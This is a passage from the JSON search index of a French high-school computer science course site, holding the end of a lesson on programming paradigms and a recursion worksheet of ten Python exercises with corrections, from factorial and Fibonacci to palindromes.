\u00c9cosyst\u00e8me : Biblioth\u00e8ques, outils</p>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#recommandations-pratiques","title":"Recommandations pratiques","text":"<p>Conseils pour le choix :</p> <ol> <li>Commencez simple : Paradigme imp\u00e9ratif/proc\u00e9dural</li> <li>\u00c9voluez progressivement : Ajoutez OOP si n\u00e9cessaire</li> <li>Explorez le fonctionnel : Pour le traitement de donn\u00e9es</li> <li>Consid\u00e9rez la concurrence : Pour les performances</li> <li>Restez pragmatique : M\u00e9langez les approches</li> </ol>"},{"location":"terminale/V-Langages_et_programmation/Cours/paradigmes_programmation/#exercices-pratiques","title":"Exercices pratiques","text":"<p>TP 1 : Comparaison de paradigmes</p> <ol> <li>Impl\u00e9mentez un syst\u00e8me de gestion de biblioth\u00e8que en style proc\u00e9dural</li> <li>Refactorisez en orient\u00e9 objet</li> <li>Cr\u00e9ez une version fonctionnelle pour les requ\u00eates</li> <li>Comparez lisibilit\u00e9, maintenabilit\u00e9 et performance</li> </ol> <p>TP 2 : Patterns de conception</p> <ol> <li>Impl\u00e9mentez le pattern Strategy pour diff\u00e9rents algorithmes de tri</li> <li>Utilisez Observer pour un syst\u00e8me de notifications</li> <li>Cr\u00e9ez une Factory pour g\u00e9n\u00e9rer diff\u00e9rents types de documents</li> <li>Testez la flexibilit\u00e9 et l'extensibilit\u00e9</li> </ol> <p>TP 3 : Programmation concurrente</p> <ol> <li>Cr\u00e9ez un web scraper s\u00e9quentiel</li> <li>Parall\u00e9lisez avec threading</li> <li>Impl\u00e9mentez une version asynchrone</li> <li>Mesurez et comparez les performances</li> </ol> <pre><code>\ud83d\udcdd Exercices\n\ud83d\udd2c TP Comparaison\n\ud83c\udfd7\ufe0f TP Patterns\n</code></pre>"},{"location":"terminale/VI-Algorithmique/Cours/recursivite/","title":"\ud83d\udd04 R\u00e9cursivit\u00e9","text":""},{"location":"terminale/VI-Algorithmique/Cours/recursivite/#introduction","title":"Introduction","text":"<p>La r\u00e9cursivit\u00e9 est un concept fondamental en informatique o\u00f9 une fonction s'appelle elle-m\u00eame pour r\u00e9soudre un probl\u00e8me en le d\u00e9composant en sous-probl\u00e8mes plus simples.</p>"},{"location":"terminale/VI-Algorithmique/Cours/recursivite/#concepts-cles","title":"Concepts cl\u00e9s","text":"<ul> <li>Cas de base : condition d'arr\u00eat de la r\u00e9cursion</li> <li>Cas g\u00e9n\u00e9ral : appel r\u00e9cursif avec un probl\u00e8me r\u00e9duit</li> <li>Pile d'ex\u00e9cution : m\u00e9canisme de gestion des appels</li> </ul>"},{"location":"terminale/VI-Algorithmique/Cours/recursivite/#exemples-classiques","title":"Exemples classiques","text":"<ul> <li>Factorielle</li> <li>Suite de Fibonacci</li> <li>Parcours d'arbres</li> <li>Algorithmes de tri (quicksort, mergesort)</li> </ul>"},{"location":"terminale/VI-Algorithmique/Exercices/Fiche_exercices_recursivite/","title":"\ud83d\udd04 Fiche d'exercices \u2013 R\u00e9cursivit\u00e9","text":"<p>\ud83c\udfaf Objectif</p> <p>Ma\u00eetriser la programmation r\u00e9cursive en impl\u00e9mentant des fonctions qui s'appellent elles-m\u00eames pour r\u00e9soudre des probl\u00e8mes.</p> <p>\ud83d\udca1 Rappel pour tous les exercices</p> <ul> <li>D\u00e9finir le cas terminal (ou cas de base) qui arr\u00eate la r\u00e9cursion</li> <li>D\u00e9finir le cas g\u00e9n\u00e9ral (comment le probl\u00e8me se r\u00e9duit \u00e0 un sous-probl\u00e8me plus simple)</li> <li>Impl\u00e9menter la fonction r\u00e9cursive qui s'appelle elle-m\u00eame</li> </ul> \ud83c\udfaf Exercices de Base \ud83d\udd25 Niveau Interm\u00e9diaire \ud83d\ude80 Niveau Avanc\u00e9 Base \ud83e\udd8a Exercice 1 \u2013 Factorielle 1. D\u00e9finir le cas terminal pour la factorielle. 2. \u00c9crire une fonction <code>factorielle(n)</code> r\u00e9cursive. 3. Tester avec <code>n = 5</code> et <code>n = 0</code>. Indice : le cas terminal est <code>0! = 1</code>. \u2192 Voir la correction              <pre><code># Cas terminal : 0! = 1\n# Cas r\u00e9cursif : n! = n \u00d7 (n-1)!\n\ndef factorielle(n: int) -&gt; int:\n    if n == 0:\n        return 1\n    return n * factorielle(n - 1)</code></pre> Base \ud83e\udd8a Exercice 2 \u2013 Suite de Fibonacci 1. D\u00e9finir les cas terminaux de la suite de Fibonacci. 2. \u00c9crire une fonction <code>fibonacci(n)</code> r\u00e9cursive. 3. Tester avec <code>n = 6</code> et <code>n = 0</code>. Indice : les cas terminaux sont <code>F(0) = 0</code> et <code>F(1) = 1</code>. \u2192 Voir la correction              <pre><code># Cas terminaux : F(0) = 0, F(1) = 1\n# Cas r\u00e9cursif : F(n) = F(n-1) + F(n-2)\n\ndef fibonacci(n: int) -&gt; int:\n    if n == 0:\n        return 0\n    if n == 1:\n        return 1\n    return fibonacci(n - 1) + fibonacci(n - 2)</code></pre> Base \ud83e\udd8a Exercice 3 \u2013 Somme des chiffres 1. D\u00e9finir le cas terminal pour la somme des chiffres d'un entier. 2. \u00c9crire une fonction <code>somme_chiffres(n)</code> r\u00e9cursive. 3. Tester avec <code>n = 245</code> et <code>n = 1001</code>. Indice : le cas terminal est <code>n = 0</code>. \u2192 Voir la correction              <pre><code># Cas terminal : n = 0\n# Cas r\u00e9cursif : somme_chiffres(n) = (n % 10) + somme_chiffres(n // 10)\n\ndef somme_chiffres(n: int) -&gt; int:\n    if n == 0:\n        return 0\n    return (n % 10) + somme_chiffres(n // 10)</code></pre> Facile \ud83c\udf1f Exercice 4 \u2013 Puissance d'un nombre 1. D\u00e9finir le cas terminal pour <code>a^b</code>. 2. \u00c9crire une fonction <code>puissance(a, b)</code> r\u00e9cursive. 3. Tester avec <code>a = 2, b = 5</code> et <code>a = 3, b = 0</code>. Indice : le cas terminal est <code>b = 0</code> car <code>a^0 = 1</code>. \u2192 Voir la correction              <pre><code># Cas terminal : exposant = 0, a^0 = 1\n# Cas r\u00e9cursif : a^n = a \u00d7 a^(n-1)\n\ndef puissance(a: int, n: int) -&gt; int:\n    if n == 0:\n        return 1\n    return a * puissance(a, n - 1)</code></pre> Facile \ud83c\udf1f Exercice 5 \u2013 Inversion de cha\u00eene 1. D\u00e9finir le cas terminal pour inverser une cha\u00eene de caract\u00e8res. 2. \u00c9crire une fonction <code>inverse_chaine(s)</code> r\u00e9cursive. 3. Tester avec <code>s = \"NSI\"</code> et <code>s = \"informatique\"</code>. Indice : le cas terminal est une cha\u00eene vide ou d'un caract\u00e8re. \u2192 Voir la correction              <pre><code># Cas terminal : cha\u00eene vide ou un seul caract\u00e8re\n# Cas r\u00e9cursif : inverse_chaine(s) = s[-1] + inverse_chaine(s[:-1])\n\ndef inverse_chaine(s: str) -&gt; str:\n    if len(s) &lt;= 1:\n        return s\n    return s[-1] + inverse_chaine(s[:-1])</code></pre> Interm\u00e9diaire \ud83d\udd25 Exercice 6 \u2013 Liste cha\u00een\u00e9e (POO) 1. Cr\u00e9er une classe <code>Noeud</code> avec <code>valeur</code> et <code>suivant</code>. 2. D\u00e9finir le cas terminal pour calculer la longueur d'une liste cha\u00een\u00e9e. 3. \u00c9crire <code>longueur_liste(noeud)</code> r\u00e9cursive : longueur d'un noeud = 1 + longueur du suivant. 4. Cr\u00e9er une liste de 4 noeuds et tester. Indice : le cas terminal est un noeud <code>None</code>. \u2192 Voir la correction              <pre><code># Cas terminal : noeud est None (liste vide)\n# Cas r\u00e9cursif : longueur = 1 + longueur du reste de la liste\n\nclass Noeud:\n    def __init__(self, valeur, suivant=None):\n        self.valeur = valeur\n        self.suivant = suivant\n\ndef longueur_liste(noeud: Noeud) -&gt; int:\n    if noeud is None:\n        return 0\n    return 1 + longueur_liste(noeud.suivant)</code></pre> Interm\u00e9diaire \ud83d\udd25 Exercice 7 \u2013 Recherche dans une liste 1. D\u00e9finir le cas terminal pour la recherche d'une valeur. 2. \u00c9crire <code>recherche(liste, valeur)</code> r\u00e9cursive. 3. Tester avec <code>liste = [2, 5, 8, 10]</code> et <code>valeur = 5</code>. Indice : le cas terminal est une liste vide. \u2192 Voir la correction              <pre><code># Cas terminal : liste vide (\u00e9l\u00e9ment non trouv\u00e9) ou \u00e9l\u00e9ment trouv\u00e9\n# Cas r\u00e9cursif : chercher dans le reste de la liste\n\ndef recherche(liste: list, element) -&gt; bool:\n    if len(liste) == 0:\n        return False\n    if liste[0] == element:\n        return True\n    return recherche(liste[1:], element)</code></pre> Interm\u00e9diaire \ud83d\udd25 Exercice 8 \u2013 Somme des \u00e9l\u00e9ments d'une liste 1. D\u00e9finir le cas terminal pour la somme d'une liste. 2. \u00c9crire <code>somme_liste(liste)</code> r\u00e9cursive. 3. Tester avec <code>liste = [1, 2, 3, 4, 5]</code>. Indice : le cas terminal est une liste vide. \u2192 Voir la correction              <pre><code># Cas terminal : liste vide\n# Cas r\u00e9cursif : somme = premier \u00e9l\u00e9ment + somme du reste\n\ndef somme_liste(liste: list) -&gt; int:\n    if len(liste) == 0:\n        return 0\n    return liste[0] + somme_liste(liste[1:])</code></pre> Avanc\u00e9 \ud83d\ude80 Exercice 9 \u2013 Palindrome 1. D\u00e9finir le cas terminal pour v\u00e9rifier si une cha\u00eene est un palindrome. 2. \u00c9crire <code>est_palindrome(s)</code> r\u00e9cursive. 3. Tester avec <code>s = \"radar\"</code> et <code>s = \"NSI\"</code>. Indice : le cas terminal est une cha\u00eene vide ou \u00e0 un caract\u00e8re. \u2192 Voir la correction              <pre><code># Cas terminal : cha\u00eene vide ou un seul caract\u00e8re\n# Cas r\u00e9cursif : premier = dernier ET le milieu est un palindrome\n\ndef est_palindrome(s: str) -&gt; bool:\n    if len(s) &lt;= 1:\n        return True\n    if s[0] == s[-1]:\n        return est_palindrome(s[1:-1])\n    else:\n        return False</code></pre> Bonus \ud83e\udd8a Exercice 10 \u2013 Dessin de motifs (bonus) 1. D\u00e9finir le cas terminal pour le dessin d'un triangle. 2. \u00c9crire <code>triangle(n)</code> r\u00e9cursive. 3. Tester avec <code>n = 5</code>. Indice : le cas terminal est <code>n = 0</code>. \u2192 Voir la correction              <pre><code># Cas terminal : n = 0\n# Cas r\u00e9cursif : afficher n \u00e9toiles puis appel r\u00e9cursif avec n-1\n\ndef triangle(n: int) -&gt; None:\n    if n == 0:\n        return\n    print('*' * n)\n    triangle(n - 1)</code></pre>"}]}